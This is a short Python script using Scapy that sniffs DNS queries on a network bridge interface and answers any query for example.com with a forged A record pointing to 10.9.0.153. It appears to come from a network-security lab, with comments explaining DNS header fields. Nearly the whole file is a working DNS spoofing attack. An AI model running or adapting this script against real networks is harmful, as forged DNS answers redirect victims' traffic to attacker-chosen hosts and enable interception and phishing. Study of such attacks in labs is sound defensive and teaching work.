# https://www.catchpoint.com/blog/how-dns-works
# https://www.geeksforgeeks.org/dns-message-format/

from scapy.all import *
import sys

NS_NAME = "example.com"

def spoof_dns(pkt):
    if(DNS in pkt and NS_NAME in pkt[DNS].qd.qname.decode('utf-8')):
        print(f"IP Source: {pkt[IP].src}")
        print(f"IP Destination: {pkt[IP].dst}")
        
        # Construct IP and UDP Header
        # Swapping Source and Destination IP
        ip = IP(src = pkt[IP].dst, dst = pkt[IP].src)
        udp = UDP(sport = 53, dport = pkt[UDP].sport)

        # The Answer Section
        """
        - A: IP Host Address
        - CNAME: name of the alias
        - NS: name of the server
        - MX: Mail servers
        """
        AnsRR = DNSRR(rrname = pkt[DNS].qd.qname, type = 'A', ttl = 200, rdata = '10.9.0.153')

        # Construct DNS header
        """
        - id: Identifier
        - qd: Quer(y)/(ies) Domain section - must be the same in Request message if using the Response message.
        - qr: Query(0) / Response(1)
        - rd: Recursive Desired - if the value in Request message is 1 then the server need to answer the 
            query recursively.
        - aa: Authoritative Answer - check whether the answer contains Authoritative records.
        - qdcount: number of records in Query Domain section
        - ancount: number of records in Answer section
        - nscount: number of records in Authority section
        - arcount: number of records in Additional section
        - an: Answer section
        - ns: Authoritative section
        - ar: Additional section
        """
        dns = DNS(id = pkt[DNS].id, qd = pkt[DNS].qd, qr = 1, rd = pkt[DNS].rd, qdcount = 1, 
                        ancount = 1, an = AnsRR)
        
        # Create and send a spoofed packet
        spoofed_pkt = ip/udp/dns
        send(spoofed_pkt)


# Sniff the UDP query packets
f = "udp and dst port 53"
pkt = sniff(iface='br-fc78237843c2', filter=f, prn=spoof_dns)